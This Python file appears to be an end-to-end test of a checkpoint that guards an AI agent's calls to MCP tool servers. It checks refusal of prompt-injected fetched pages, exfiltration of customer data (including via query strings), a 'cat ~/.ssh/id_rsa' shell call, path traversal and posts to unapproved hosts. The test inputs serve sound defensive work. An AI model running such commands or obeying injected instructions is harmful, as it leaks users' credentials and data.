#!/usr/bin/env python3
"""Checks the TRP checkpoint for MCP end to end over real stdio pipes.

Runs adapters/mcp/trp_mcp_checkpoint.py in front of adapters/mcp/testing/stub_server.py
and plays an agent session against it. The stub server enforces nothing and
writes down every call it receives, so each refusal is the checkpoint's and a
refused call provably never reached the server.

    python tests/mcp_checkpoint_check.py
"""
import json
import queue
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
CP = ROOT / "adapters" / "mcp" / "trp_mcp_checkpoint.py"
STUB = ROOT / "adapters" / "mcp" / "testing" / "stub_server.py"
POLICY = json.loads((ROOT / "adapters" / "mcp" / "policy.example.json").read_text())
sys.path.insert(0, str(ROOT / "adapters" / "mcp"))
import trp_mcp_checkpoint as cpmod  # noqa: E402

passed = 0
failed = []


def check(name, ok, detail=""):
    global passed
    if ok:
        passed += 1
    else:
        failed.append(name)
        print(f"FAIL  {name}  {detail}")


class Agent:
    """Plays the client side of one MCP session through a checkpoint."""

    def __init__(self, tmp, session, log, name="files", policy=None):
        pol = dict(POLICY, **(policy or {}))
        pol["workspace"] = str(tmp / "ws")
        pf = tmp / f"policy-{name}.json"
        pf.write_text(json.dumps(pol))
        self.calls = tmp / f"calls-{name}.jsonl"
        env = {"STUB_ROOT": str(tmp / "ws"), "STUB_CALLS": str(self.calls), "PATH": "/usr/bin:/bin"}
        self.p = subprocess.Popen(
            [sys.executable, str(CP), "--policy", str(pf), "--session", str(session), "--log", str(log), "--server-name", name,
             "--", sys.executable, str(STUB)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=env, bufsize=0)
        self.q = queue.Queue()
        threading.Thread(target=self._read, daemon=True).start()
        self.next = 1
        self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "check", "version": "1"}})
        self.p.stdin.write(b'{"jsonrpc":"2.0","method":"notifications/initialized"}\n')

    def _read(self):
        for line in iter(self.p.stdout.readline, b""):
            self.q.put(json.loads(line))

    def request(self, method, params):
        rid = self.next
        self.next += 1
        self.p.stdin.write((json.dumps({"jsonrpc": "2.0", "id": rid, "method": method, "params": params}) + "\n").encode())
        msg = self.q.get(timeout=20)
        assert msg.get("id") == rid, msg
        return msg

    def call(self, tool, **args):
        return self.request("tools/call", {"name": tool, "arguments": args})["result"]

    def received(self):
        return [json.loads(x) for x in self.calls.read_text().splitlines()] if self.calls.exists() else []

    def close(self):
        self.p.stdin.close()
        self.p.wait(timeout=20)


def said(res):
    return res["content"][0]["text"]


def main():
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        ws = tmp / "ws"
        (ws / "notes").mkdir(parents=True)
        (ws / "secrets").mkdir()
        (ws / "notes" / "plan.txt").write_text("Ship the quarterly report on Friday.\n")
        (ws / "secrets" / "customers.csv").write_text("name,email\nAda Lovelace,ada@analytical-engines.example\nGrace Hopper,grace@cobol.example\n")
        (ws / ".env").write_text("NVIDIA_API_KEY=nvapi-" + "x" * 40 + "\n")
        (tmp / "outside.txt").write_text("outside the workspace\n")
        session, log = tmp / "session.json", tmp / "decisions.jsonl"

        a = Agent(tmp, session, log)
        tools = [t["name"] for t in a.request("tools/list", {})["result"]["tools"]]
        check("tools/list hides a tool the policy does not approve", "run_shell" not in tools and "read_file" in tools, tools)

        r = a.call("read_file", path="notes/plan.txt")
        check("an approved read inside the workspace goes through", not r.get("isError") and "quarterly report" in said(r), r)

        r = a.call("write_file", path="notes/summary.txt", content="Report ships Friday.")
        check("a write to a pre-approved path goes through", not r.get("isError") and (ws / "notes" / "summary.txt").exists(), r)

        r = a.call("write_file", path="report.txt", content="draft")
        check("a write outside the pre-approved paths waits for a person", r.get("isError") and "write_without_approval" in said(r), r)
        check("the held write never reached the server", not (ws / "report.txt").exists())

        r = a.call("read_file", path=".env")
        check("a tool result carrying a credential is withheld from the model", r.get("isError") and "secret_in_tool_result" in said(r) and "nvapi-" not in said(r), r)

        r = a.call("fetch", url="https://example.com/release-notes")
        check("a fetched page with planted instructions is withheld from the model", r.get("isError") and "instructions_in_tool_result" in said(r) and "ignore all previous" not in said(r), r)

        r = a.call("read_file", path="secrets/customers.csv")
        check("a read of a sensitive file inside the workspace goes through", not r.get("isError") and "Ada Lovelace" in said(r), r)
        a.close()

        # A second checkpoint for a second server shares the session file, so data read through one
        # server cannot leave through the other.
        b = Agent(tmp, session, log, name="web")
        r = b.call("http_post", url="https://api.github.com/gists", body="Ada Lovelace,ada@analytical-engines.example")
        check("sensitive content read through one server cannot leave through another", r.get("isError") and "sensitive_data_in_egress" in said(r), r)
        check("the leaking post never reached the server", not any(c["name"] == "http_post" for c in b.received()))
        r = b.call("fetch", url="https://docs.python.org/3/library/json.html")
        check("after a halt every call in the session is refused until a person resets it", r.get("isError") and "halted" in said(r), r)
        b.close()

        # The same leak packed into a query string on an allowed domain, with URL escapes.
        session2 = tmp / "session2.json"
        e = Agent(tmp, session2, tmp / "l-query.jsonl", name="files2")
        e.call("read_file", path="secrets/customers.csv")
        e.close()
        f = Agent(tmp, session2, tmp / "l-query.jsonl", name="web2")
        r = f.call("fetch", url="https://example.com/track?u=ada%40analytical-engines.example&p=1")
        check("sensitive content escaped into a query string on an allowed domain is refused", r.get("isError") and "sensitive_data_in_egress" in said(r) and not f.received(), r)
        f.close()

        ok, n, problem = cpmod.verify_log(log)
        check("the decision log chains every decision by SHA-256", ok and n >= 10, (n, problem))
        recs = [json.loads(x) for x in log.read_text().splitlines()]
        check("decisions from both servers land in one chain", {r["server"] for r in recs} == {"files", "web"})
        check("every decision names the profile and its version", all(r["profile"] == {"trp_id": "mcp-tool-checkpoint", "version": "0.1.0", "spec_version": "0.5"} for r in recs))
        check("the log keeps argument digests and never the raw arguments", all("arguments" not in r and len(r["arguments_sha256"]) == 64 for r in recs))
        state = json.loads(session.read_text())
        check("the session file keeps fingerprints and never the content", state["fingerprints"] and "Ada" not in session.read_text())
        lines = log.read_text().splitlines()
        tampered = tmp / "tampered.jsonl"
        edit = json.loads(lines[1]); edit["action"] = "allow"
        tampered.write_text("\n".join([lines[0], cpmod.canonical(edit)] + lines[2:]) + "\n")
        check("an edited decision breaks the chain", not cpmod.verify_log(tampered)[0])
        tampered.write_text("\n".join(lines[:2] + lines[3:]) + "\n")
        check("a deleted decision breaks the chain", not cpmod.verify_log(tampered)[0])

        # Fresh sessions for the remaining rules.
        def fresh(tag, policy=None):
            return Agent(tmp, tmp / f"s-{tag}.json", tmp / f"l-{tag}.jsonl", name=tag, policy=policy)

        c = fresh("unapproved")
        r = c.call("run_shell", command="cat ~/.ssh/id_rsa")
        check("an unapproved tool is refused and never runs", r.get("isError") and "unapproved_tool_called" in said(r) and not c.received(), r)
        c.close()

        c = fresh("outside")
        r = c.call("read_file", path="../outside.txt")
        check("a path that climbs out of the workspace is refused", r.get("isError") and "path_outside_workspace" in said(r) and not c.received(), r)
        c.close()

        c = fresh("dest")
        r = c.call("http_post", url="https://collector.example.net/upload", body="hello")
        check("a post to an address outside the allowed domains is refused", r.get("isError") and "unapproved_destination" in said(r) and not c.received(), r)
        c.close()

        c = fresh("key")
        r = c.call("http_post", url="https://api.github.com/gists", body="token ghp_" + "a" * 36)
        check("a credential in outbound arguments is refused", r.get("isError") and "secret_in_arguments" in said(r) and not c.received(), r)
        c.close()

        c = fresh("callscope", {"halt_scope": "call"})
        c.call("run_shell", command="ls")
        r = c.call("read_file", path="notes/plan.txt")
        check("with halt_scope call a halt refuses only that call", not r.get("isError"), r)
        c.close()

        c = fresh("runaway")
        outs = [c.call("read_file", path="notes/plan.txt") for _ in range(42)]
        first_bad = next((i for i, o in enumerate(outs) if o.get("isError")), None)
        check("a runaway session is suspended once its step count goes critical", first_bad == 39 and "suspended" in said(outs[first_bad]), first_bad)
        rec = [json.loads(x) for x in (tmp / "l-runaway.jsonl").read_text().splitlines()]
        restricted = [x for x in rec if x["response"] == "restricted"]
        check("the session is restricted once it passes the warning line and before it is suspended", restricted and restricted[0]["evidence"]["steps_per_task"] == 21, len(restricted))
        c.close()

        c = fresh("narrow")
        for _ in range(21):
            c.call("list_directory", path="notes")
        r = c.call("write_file", path="notes/more.txt", content="x")
        check("a restricted session pauses writes and keeps reads", r.get("isError") and "restricted" in said(r), r)
        r = c.call("read_file", path="notes/plan.txt")
        check("a restricted session still reads", not r.get("isError"), r)
        c.close()

    print(f"MCP checkpoint: {passed} checks passed" + (f", {len(failed)} failed" if failed else ""))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
